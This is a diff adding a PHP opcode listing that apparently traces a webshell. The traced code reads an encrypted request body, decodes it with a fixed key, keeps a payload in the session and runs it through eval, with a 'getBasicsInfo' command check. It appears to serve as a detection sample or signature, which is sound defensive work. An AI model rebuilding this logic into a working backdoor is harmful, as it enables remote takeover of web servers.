@@ -1,0 +1,42 @@
+FunctionStart 
+INIT_FCALL 'session_start'
+DO_ICALL 
+INIT_FCALL 'set_time_limit'
+DO_ICALL 
+INIT_FCALL 'error_reporting'
+DO_ICALL 
+ASSIGN 'payload'
+ASSIGN '716f6b30598ba309'
+INIT_FCALL 'file_get_contents'
+SEND_VAL 'php://input'
+DO_ICALL 
+INIT_FCALL 'encode'
+DO_FCALL 
+FETCH_IS '_SESSION'
+INIT_FCALL 'encode'
+FETCH_R '_SESSION'
+DO_FCALL 
+INIT_FCALL 'strpos'
+SEND_VAL 'getBasicsInfo'
+DO_ICALL 
+INIT_FCALL 'encode'
+DO_FCALL 
+INCLUDE_OR_EVAL 'EVAL'
+INIT_FCALL 'encode'
+INIT_FCALL_BY_NAME 'run'
+DO_FCALL 
+DO_FCALL 
+INIT_FCALL 'strpos'
+SEND_VAL 'getBasicsInfo'
+DO_ICALL 
+INIT_FCALL 'encode'
+DO_FCALL 
+FETCH_W '_SESSION'
+RETURN 1
+FunctionEnd 
+FunctionStart 
+ADD 1
+BW_AND 15
+RETURN 
+RETURN 'null'
+FunctionEnd 
